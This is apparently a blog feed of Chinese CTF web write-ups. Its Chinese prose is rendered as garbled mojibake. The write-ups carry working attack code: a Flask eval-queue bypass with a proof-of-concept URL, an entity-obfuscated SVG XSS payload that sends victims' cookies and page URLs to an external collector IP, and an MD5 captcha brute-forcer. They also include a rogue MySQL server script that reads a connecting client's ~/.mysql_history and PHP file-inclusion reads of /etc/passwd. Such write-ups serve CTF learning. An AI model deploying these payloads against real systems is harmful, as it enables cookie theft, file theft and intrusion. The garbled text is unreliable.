&apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos; html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos; elif page == &apos;shop&apos;: html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos; elif page == &apos;reset&apos;: del session[&apos;num_items&apos;] html += &apos;Session reset.&lt;br /&gt;&apos; html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == &apos;True&apos;: source = open(&apos;eventLoop.py&apos;, &apos;r&apos;) html = &apos;&apos; if bool_download_source != &apos;True&apos;: html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos; html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; for line in source: if bool_download_source != &apos;True&apos;: html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;) else: html += line source.close() if bool_download_source == &apos;True&apos;: headers = {} headers[&apos;Content-Type&apos;] = &apos;text/plain&apos; headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos; return Response(html, headers=headers) else: return html else: trigger_event(&apos;action:view;index&apos;) def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return &apos;invalid number({}) of diamonds to buy&lt;br /&gt;&apos;.format(args[0]) session[&apos;num_items&apos;] += num_items trigger_event([&apos;func:consume_point;{}&apos;.format(num_items), &apos;action:view;index&apos;]) def consume_point_function(args): point_to_consume = int(args[0]) if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException() session[&apos;points&apos;] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return &apos;You naughty boy! ;) &lt;br /&gt;&apos; def get_flag_handler(args): if session[&apos;num_items&apos;] &gt;= 5: trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(&apos;action:view;index&apos;) if __name__ == &apos;__main__&apos;: app.run(debug=False, host=&apos;0.0.0.0&apos;) ‰∏çÁúãÊ∫êÁ†Å‰πüÂ∫îËØ•ËÉΩÁåúÂà∞Â§ßÊ¶ÇÔºåËøôÈÅìÈ¢òÁõÆÂ§ßÊ¶ÇÊÑèÊÄùÊòØÊØè‰∏™sessionÂèØ‰ª•‰π∞‰∏âÊ¨°ÈíªÁü≥Ôºå‰ΩÜÊòØ‰π∞Âà∞‰∫îÈ¢óÊâçÊúâÂèØËÉΩÂéªÊü•ÁúãflagÔºåÊâÄ‰ª•È¶ñÂÖàÈúÄË¶ÅÁªïËøáÔºåË¥≠‰π∞ÈôêÂà∂ÔºåÁÑ∂ÂêéËøõË°å‰∏ã‰∏ÄÊ≠•ÁöÑÂèØÊéßÂèÇÊï∞ÊûÑÈÄ†ÂáΩÊï∞Êù•ÊâßË°å„ÄÇ È¶ñÂÖà‰ªéflagÂáΩÊï∞ÂÖ•Êâã„ÄÇ def get_flag_handler(args): if session[&apos;num_items&apos;] &gt;= 5: trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(&apos;action:view;index&apos;) Â¶ÇÊûúsession‰∏≠Â∑≤ÁªèË¥≠‰π∞ÁöÑÊï∞ÈáèÂ§ß‰∫é5ÔºåÈÇ£‰πàË∞ÉÁî®trigger_event(), def trigger_event(event): session[&apos;log&apos;].append(event) if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) ËÄåÊúÄÁªàÊâßË°å‰∫ÜÊ≠§flagÂáΩÊï∞‰πãÂêéÂπ∂‰∏ç‰ºöÁõ¥Êé•ÊòæÁ§∫flagÔºåËøô‰∏ÄÂè•session[‚Äòlog‚Äô].append(event)‰ºöÂ∞ÜflagÊãºÊé•Âà∞session‰∏≠ÂéªÔºåflaskÁöÑsessionÂàÜ‰∏âÈÉ®ÂàÜÁªÑÊàêÔºåÁ¨¨‰∏ÄÈÉ®ÂàÜÂ∞±ÊòØÊ≠£Â∏∏ÁöÑ‰∏Ä‰∫õÊèê‰∫§Êï∞ÊçÆÔºåÁ¨¨‰∫åÈÉ®ÂàÜÊó∂Èó¥Êà≥ÔºåÁÑ∂ÂêéÊãºÊé•‰∏äÁ≠æÂêçÔºåÁ¨¨‰∏ÄÈÉ®ÂàÜÊàë‰ª¨ÊòØÂèØ‰ª•Áõ¥Êé•ÊòéÊñáÊü•ÁúãÁöÑÔºåÈôÑ‰∏äPÁâõÁöÑsessionËÑöÊú¨„ÄÇ #!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b&apos;.&apos;, 1) payload, timestamp = payload.rsplit(b&apos;.&apos;, 1) decompress = False if payload.startswith(b&apos;.&apos;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&apos;Could not base64 decode the payload because of &apos; &apos;an exception&apos;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&apos;Could not zlib decompress the payload before &apos; &apos;decoding the payload&apos;) return session_json_serializer.loads(payload) if __name__ == &apos;__main__&apos;: print decryption(sys.argv[1].encode())È¶ñÂÖàÈöè‰æøÂ§çÂà∂‰∏ÄÊÆµÈ¢òÁõÆÁöÑsessionÊù•ËøõË°åËß£Á†Å„ÄÇ session‰øùÂ≠ò‰∫ÜÊï∞ÊçÆÔºåÂ∑≤Áªè‰π∞‰∫Ü‰∏§‰∏™ËøòÊúâ‰∏ÄÊ¨°Ë¥≠‰π∞ÁöÑÊú∫‰ºö„ÄÇËøòÊúâlogÔºåÊòØÊúÄÂêéÊü•ÁúãflagÁöÑÊó∂ÂÄô‰ºöÊãºÊé•ËøõÂéªÁöÑÊï∞ÊçÆ„ÄÇ Âπ∂‰∏îlogÂè™‰ºö‰øùÂ≠ò‰∫îÊù°„ÄÇÁÑ∂ÂêéÂ∞±ÊòØÂ¶Ç‰ΩïÊâßË°ådef get_flag_handler(args): ÂáΩÊï∞‰∫Ü„ÄÇ Âú®def execute_event_loop(): ÂáΩÊï∞‰∏≠ÊúâevalÂáΩÊï∞ÂèØ‰ª•Â∏ÆÂä©Êàë‰ª¨ÊâßË°åÂáΩÊï∞„ÄÇÂπ∂‰∏îÂ≠òÂú®ÊãºÊé•ÔºåËæìÂÖ•ÁöÑÂèÇÊï∞Â∞Ü‰ºöÊãºÊé•_handlerÔºåÁÑ∂ÂêéÊâßË°åÁõ∏Â∫îÁöÑÂáΩÊï∞„ÄÇ try: event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) ret_val = event_handler(args) ‰ΩÜÊòØÂØπËæìÂÖ•Â≠óÁ¨¶ÊúâÊéßÂà∂Ôºå valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) Âè™ËÉΩËæìÂÖ•ÈôêÂÆöÂ≠óÁ¨¶ÊãºÊé•ÊåáÂÆöÁöÑhandlerÊàñËÄÖfunctionÔºåÂ∞Ü#urlÁºñÁ†ÅÔºåÊù•ÁªïËøáevalÂáΩÊï∞ÁöÑËß£ÊûêÔºåÁ¨¨‰∏ÄÊ¨°ÁöÑÊãºÊé•‰∏∫trigger_event#_handlerÔºåÂú®evalÂáΩÊï∞ÈáåÊâßË°åÂàô‰ºöÁúÅÁï•#ÂêéÁöÑ_handerÔºå‰ªéËÄåÊâßË°åtrigger_eventÔºåÈÄöËøátrigger_event()Â∞ÜflagÂÜôËøõsession_log„ÄÇ ‰ΩÜÊòØÂ¶ÇÊûúË¶ÅÊâßË°åexecute_event_loop()ÈáåÁöÑevalÂíåÊàë‰ª¨‰º†ÂÖ•ÁöÑÂèÇÊï∞ÔºåÈúÄË¶Ådef trigger_event(event)ÈáåÁöÑ if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event)Â∞Ü‰∫ã‰ª∂Âä†ÂÖ•ÈòüÂàó„ÄÇ‰ªéËÄåÊâßË°åbugÔºåget_flag ÊúÄÁªàpoc http://116.85.48.107:5002/d5af33f66147e857/?action:trigger_event%23;action:buy;30%23action:get_flag;322Âõ†‰∏∫Ë¥≠‰π∞ÁöÑËßÑÂàôÊòØÂÖàË¥≠‰π∞ÔºåË¥≠‰π∞ÊàêÂäüÂêéÂú®Âà§Êñ≠ÊòØÂê¶ÂêàÊ≥ïÔºåÊ≠§Êó∂get_flagÂ∑≤ÁªèÊâßË°åÔºåÊâÄ‰ª•‰æøÂèØ‰ª•ÁªïËøáÂè™ËÉΩË¥≠‰π∞‰∏â‰∏™ÁöÑÈôêÂà∂„ÄÇ ÂèØ‰ª•ÁúãÂà∞ÊâßË°åbuy,get_flag‰πãÂêéÊâç‰ºöÂà§Êñ≠ÂêàÊ≥ïÔºåËøõËÄåÂõûÊ∫ØÔºåÂπ∂‰∏çÂΩ±ÂìçËé∑ÂæóflagÔºåËÄåÂú®Ëé∑Âæóflag‰πãÂêéÊâç‰ºöÊâßË°åÂà§Êñ≠ÂõûÊ∫ØÂáΩÊï∞ÔºåÂ∞ÜË¥≠‰π∞Êï∞ÈáèÈáçÁΩÆ„ÄÇ ÂØπËøîÂõûÁöÑÊï∞ÊçÆËøõË°åËß£Á†Å„ÄÇ Ê¨¢ËøéÊä•ÂêçDDCTFÁî±‰∫éÈ¢òÁõÆÊöÇÊó∂ÂÖ≥Èó≠ÔºåÁÆÄÂçïÂÜô‰∏ãÊ≠§È¢òwp„ÄÇ ËøõÂéª‰πãÂêéÊòØ‰∏Ä‰∏™Êä•ÂêçÈ°µÈù¢ÔºåÂâç‰∏§‰∏™Ê°ÜÈôêÂÆö‰∫ÜÂ≠óÁ¨¶20‰∏îÂøÖÂ°´ÔºåÊúÄÂêé‰∏Ä‰∏™Ê°ÜÊó†‰ªª‰ΩïÈôêÂà∂Ôºå‰ΩÜÊòØÊú™‰ΩúXSSÈôêÂà∂„ÄÇ Âê¨ËØ¥ËøôÈáå‰πüÂèØ‰ª•XSS ËØªÂèñÊ∫êÁ†ÅÔºå‰∏çËøáÊàëÊòØÁÆÄÂçïXSS &lt;img src=vpsIP&gt;ËØ∑Ê±ÇÂ§¥ÈáåÂ∏¶‰∫Ü‰∏Ä‰∏™ÊèêÁ§∫Ôºåhttp://139.199.107.193/hint.php ÂèëË°®ÊñáÁ´†‰πãÂêé‰ºöÁªô‰Ω†ÊñáÁ´†ÁöÑÈìæÊé•ÔºåÂºÄÂßãËøò‰∏çÁü•ÈÅìÊúâ‰ªÄ‰πàÁî®„ÄÇ ÂèëÁé∞ÂèçÈ¶àÈ°µÈù¢ÔºåËøôÂ∞±ÂæàÊ∏ÖÊ•ö‰∫ÜÂèëË°®ÊñáÁ´†ÔºåÁÑ∂ÂêéÁªôÊúçÂä°Âô®Êù•Êü•ÁúãÔºåÂØºËá¥XSSÔºå XSSÁªïËøá‰∏çÂ§öËØ¥‰∫ÜÔºåÂèØ‰ª•ÂèÇËÄÉÊàëÁöÑXSSÂ∞èÁªìÈáåÁöÑsvgÈªëÈ≠îÊ≥ï„ÄÇ &lt;svg&gt;&lt;script&gt; &amp;#118;&amp;#97;&amp;#114;&amp;#32;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#52;&amp;#55;&amp;#46;&amp;#49;&amp;#48;&amp;#54;&amp;#46;&amp;#49;&amp;#56;&amp;#53;&amp;#46;&amp;#54;&amp;#57;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#105;&amp;#110;&amp;#100;&amp;#101;&amp;#120;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#59; &amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#40;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#73;&amp;#109;&amp;#97;&amp;#103;&amp;#101;&amp;#40;&amp;#41;&amp;#41;&amp;#46;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#119;&amp;#101;&amp;#98;&amp;#115;&amp;#105;&amp;#116;&amp;#101;&amp;#43;&amp;#39;&amp;#47;&amp;#63;&amp;#107;&amp;#101;&amp;#101;&amp;#112;&amp;#115;&amp;#101;&amp;#115;&amp;#115;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#49;&amp;#38;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#116;&amp;#111;&amp;#112;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#116;&amp;#111;&amp;#112;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#43;&amp;#39;&amp;#38;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#61;&amp;#39;&amp;#43;&amp;#101;&amp;#115;&amp;#99;&amp;#97;&amp;#112;&amp;#101;&amp;#40;&amp;#40;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#123;&amp;#116;&amp;#114;&amp;#121;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#40;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#38;&amp;#38;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#41;&amp;#63;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#101;&amp;#114;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#58;&amp;#39;&amp;#39;&amp;#125;&amp;#99;&amp;#97;&amp;#116;&amp;#99;&amp;#104;&amp;#40;&amp;#101;&amp;#41;&amp;#123;&amp;#114;&amp;#101;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#39;&amp;#39;&amp;#125;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#59;&amp;#125;&amp;#41;&amp;#40;&amp;#41;&amp;#59; &lt;/script&gt;Âä†ËΩΩXSSËÑöÊú¨ÔºåÁÆÄÂçïÊèê‰∏Ä‰∏ãÔºåÂú®svgÊ†áÁ≠æÈáåÁöÑÊâÄÊúâÂÆû‰ΩìÂåñÁºñÁ†ÅÈÉΩÂèØ‰ª•Ë¢´Ëß£ÊûêËøòÂéüÔºåÂõ†‰∏∫ËøôÈáåÊäïÁ®øËøáÊª§‰∫ÜÂçïÂºïÂè∑ÂèåÂºïÂè∑Á≠â‰∫éÂè∑Êã¨Âè∑ÔºåËÉΩËøáÊª§ÁöÑÈÉΩËøáÊª§‰∫Ü„ÄÇ È™åËØÅÁ†ÅËÑöÊú¨„ÄÇ # -*- coding: utf-8 -*- import hashlib from multiprocessing.dummy import Pool as ThreadPool # MD5Êà™Êñ≠Êï∞ÂÄºÂ∑≤Áü• Ê±ÇÂéüÂßãÊï∞ÊçÆ # ‰æãÂ≠ê substr(md5(captcha), 0, 6)=60b7ef def md5(s): # ËÆ°ÁÆóMD5Â≠óÁ¨¶‰∏≤ return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest() keymd5 = &apos;5ffe8d&apos; #Â∑≤Áü•ÁöÑmd5Êà™Êñ≠ÂÄº md5start = 0 # ËÆæÁΩÆÈ¢òÁõÆÂ∑≤Áü•ÁöÑÊà™Êñ≠‰ΩçÁΩÆ md5length = 6 def findmd5(sss): # ËæìÂÖ•ËåÉÂõ¥ ÈáåÈù¢‰ºöËøõË°åmd5ÊµãËØï key = sss.split(&apos;:&apos;) start = int(key[0]) # ÂºÄÂßã‰ΩçÁΩÆ end = int(key[1]) # ÁªìÊùü‰ΩçÁΩÆ result = 0 for i in range(start, end): # print(md5(i)[md5start:md5length]) if md5(i)[0:6] == keymd5: # ÊãøÂà∞Âä†ÂØÜÂ≠óÁ¨¶‰∏≤ result = i print(result) # ÊâìÂç∞ break list=[] # ÂèÇÊï∞ÂàóË°® for i in range(10): # Â§öÁ∫øÁ®ãÁöÑÊï∞Â≠óÂàóË°® ÂºÄÂßã‰∏éÁªìÂ∞æ list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1))) pool = ThreadPool() # Â§öÁ∫øÁ®ã‰ªªÂä° pool.map(findmd5, list) # ÂáΩÊï∞ ‰∏éÂèÇÊï∞ÂàóË°® pool.close() pool.join()ÁÑ∂ÂêéÂèØ‰ª•ÊâìÂà∞cookieÊâßË°åÊâÄÊúâÁöÑjsËÑöÊú¨ http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.phpÁöÑÈ°µÈù¢ÊòæÁ§∫Ê≤°ÊúâÁôªÈôÜÔºåÂ∫îËØ•ÊòØÈúÄË¶ÅÁÆ°ÁêÜÂëòÊü•ÁúãÊ≠§È°µÈù¢ÔºåËØªÂèñadmin.phpÊ∫êÁ†ÅÂæóÂà∞Êñ∞ÁöÑÂÅöÈ¢òÁõÆÂΩï„ÄÇ http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=ÂÆΩÂ≠óËäÇÊ≥®ÂÖ•„ÄÇËé∑Âæóflag„ÄÇ mysqlÂº±Âè£‰ª§ËøôÈÅìÈ¢òËÄÉÁöÑÁü•ËØÜÁÇπÊØîËæÉÁ•û‰ªôÊìç‰Ωú„ÄÇ ÂèÇËÄÉÔºöhttps://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/ MySQLÂçèËÆÆ‰∏≠ÊØîËæÉÁâπÂà´ÁöÑ‰∏ÄÁÇπÂ∞±ÊòØÂÆ¢Êà∑Á´ØÂπ∂‰∏ç‰ºöÂéªËÆ∞ÂΩïÂ∑≤ËØ∑Ê±ÇÁöÑÂëΩ‰ª§ÔºåËÄåÊòØÊ†πÊçÆÊúçÂä°Âô®ÁöÑÂìçÂ∫îÊù•ÊâßË°åÊü•ËØ¢„ÄÇ ËøôÊÑèÂë≥ÁùÄÊÅ∂ÊÑèMySQLÊúçÂä°Âô®ÂèØ‰ª•Ê®°ÊãüÂàùÂßãÊè°ÊâãËøáÁ®ãÔºåÁ≠âÂæÖSQLËØ≠Âè•Êï∞ÊçÆÂåÖÔºåÂøΩÁï•Ëøô‰∏™Êï∞ÊçÆÂåÖÁÑ∂ÂêéÂìçÂ∫î‰∏Ä‰∏™LOCAL DATA INFILEËØ∑Ê±Ç„ÄÇ ‰πüÂ∞±ÊòØÂú®Êàë‰ª¨Âú®ÊúçÂä°Á´ØËøêË°åpyÊñá‰ª∂Ê®°ÊãümysqlÊúçÂä°Âô®ÔºåÂÆ¢Êà∑Á´ØËøûÊé•ÁöÑÊó∂ÂÄôÊûÑÈÄ†ÊÅ∂ÊÑèÊï∞ÊçÆÂåÖËØªÂèñÂÆ¢Êà∑Á´ØÁöÑÊñá‰ª∂„ÄÇ È¢òÁõÆÊèê‰æõÁöÑ agent.py ÂÖ∂ÂÆûÊòØ‰∏∫‰∫ÜÊ£ÄÊµãÂÆ¢Êà∑Á´ØÊú¨Âú∞ÊòØÂê¶ÂºÄÂêØ‰∫Ü mysql ÊúçÂä°ÔºåÂè™ÈúÄË¶ÅÂæÄÂõûÂèëÈÄÅÂ≠óÁ¨¶‰∏≤ mysqld Â∞±ËÉΩÁªïËøáÊ£ÄÊµã„ÄÇ È¶ñÂÖàËøêË°åagent.py Âè™ÊòØ‰∏∫‰∫ÜÊ£ÄÊµãÊòØÂê¶ÂºÄÂêØ‰∫ÜmysqlÔºå #!/usr/bin/env python # -*- coding: utf-8 -*- # @Time : 12/1/2019 2:58 PM # @Author : fz # @Site : # @File : agent.py # @Software: PyCharm import json from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler from optparse import OptionParser from subprocess import Popen, PIPE class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): request_path = self.path print(&quot;\n----- Request Start -----&gt;\n&quot;) print(&quot;request_path :&quot;, request_path) print(&quot;self.headers :&quot;, self.headers) print(&quot;&lt;----- Request End -----\n&quot;) self.send_response(200) self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;) self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def do_POST(self): request_path = self.path # print(&quot;\n----- Request Start -----&gt;\n&quot;) print(&quot;request_path : %s&quot;, request_path) request_headers = self.headers content_length = request_headers.getheaders(&apos;content-length&apos;) length = int(content_length[0]) if content_length else 0 # print(&quot;length :&quot;, length) print(&quot;request_headers : %s&quot; % request_headers) print(&quot;content : %s&quot; % self.rfile.read(length)) # print(&quot;&lt;----- Request End -----\n&quot;) self.send_response(200) self.send_header(&quot;Set-Cookie&quot;, &quot;foo=bar&quot;) self.end_headers() result = self._func() self.wfile.write(json.dumps(result)) def _func(self): netstat = Popen([&apos;netstat&apos;, &apos;-tlnp&apos;], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [{&apos;local_address&apos;:&quot;0.0.0.0:3306&quot;,&quot;Process_name&quot;:&quot;1234/mysqld&quot;}] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = {&apos;local_address&apos;: Local_Address, &apos;Process_name&apos;: &apos;mysqld&apos;} result.append(tmp_dic) return result do_PUT = do_POST do_DELETE = do_GET def main(): port = 8123 print(&apos;Listening on localhost:%s&apos; % port) server = HTTPServer((&apos;0.0.0.0&apos;, port), RequestHandler) server.serve_forever() if __name__ == &quot;__main__&quot;: parser = OptionParser() parser.usage = ( &quot;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&quot; &quot;Run:\n\n&quot;) (options, args) = parser.parse_args() main()ÁÑ∂ÂêéËøêË°å‰ª•‰∏ãËÑöÊú¨ËØªÂèñflag„ÄÇ import socket from time import sleep filename=&apos;~/.mysql_history&apos; a=&apos;4a0000000a352e352e353300050000007b212f663926524900fff72102000f8015000000000000000000005963644f3d2336265b796f41006d7973716c5f6e61746976655f70617373776f726400&apos;.decode(&apos;hex&apos;) b=&apos;0100000200&apos;.decode(&apos;hex&apos;) c=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename HOST = &apos;0.0.0.0&apos; PORT = 3306 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((HOST, PORT)) s.listen(5) print &apos;Server start at: %s:%s&apos; %(HOST, PORT) print &apos;wait for connection...&apos; while True: conn, addr = s.accept() print &apos;Connected by &apos;, addr conn.send(a) print conn.recv(1024).encode(&apos;hex&apos;) conn.send(b) print conn.recv(1024).encode(&apos;hex&apos;) conn.send(c) print conn.recv(1024)[4:]]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ë•øÊπñÊåëÊàòËµõweb]]></title>
    <url>%2F2019%2F04%2F13%2F%E8%A5%BF%E6%B9%96%E6%8C%91%E6%88%98%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøôÊ¨°Ë•øÊπñCTFÊÑüËßâÈöæÂ∫¶ÈÄÇ‰∏≠ÔºåÂ≠¶Âà∞‰∫Ü‰∏çÂ∞ë‰∏úË•ø„ÄÇËÆ∞‰∏ãÊù•ÂÅö‰∏™Á¨îËÆ∞„ÄÇ web1url:61.164.47.198:10000 Á¨¨‰∏ÄÈÅìÊØîËæÉÁÆÄÂçïÔºå ÂæàÊòéÊòæÊòØÊñá‰ª∂ÂåÖÂê´ÔºåÂåÖÂê´/etc/passwd È™åËØÅ‰∏Ä‰∏ã„ÄÇ ÂèØ‰ª•ÁúãÂà∞Ê≤°‰ªª‰ΩïËøáÊª§ÔºåÊé•ÁùÄÊâæflagÊñá‰ª∂ËÇØÂÆö‰∏ç‰ºöÊòØÂæàÁÆÄÂçïÁõ¥Êé•ÂåÖÂê´ÂæóÂà∞ÔºåflagÊñá‰ª∂Âêç‰πü‰∏çÊ∏ÖÊ•ö„ÄÇÊé•ÁùÄÂèëÂåÖÁúãÊ∫êÁ†ÅÊâæÂà∞ÊèêÁ§∫„ÄÇ ZGlyLnBocA==base64Ëß£Á†Å dir.phpÂ∏∏ËßÑÁõ¥Êé•ËØªÂèñÊ∫êÁ†ÅÔºåÂà©Áî®fileÂçèËÆÆbase64ËØªÂèñphpÊ∫êÁ†Å„ÄÇ„ÄÇ http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php index.phpÊñá‰ª∂ &lt;?php $a = @$_GET[&apos;file&apos;]; if (!$a) { $a = &apos;./templates/index.html&apos;; } echo &apos;include $_GET[\&apos;file\&apos;]&apos;; if (strpos(&apos;flag&apos;,$a)!==false) { die(&apos;nonono&apos;); } include $a; ?&gt; &lt;!--hint: ZGlyLnBocA== --&gt;ÂêåÁêÜËØªÂèñdir.php &lt;?php $a = 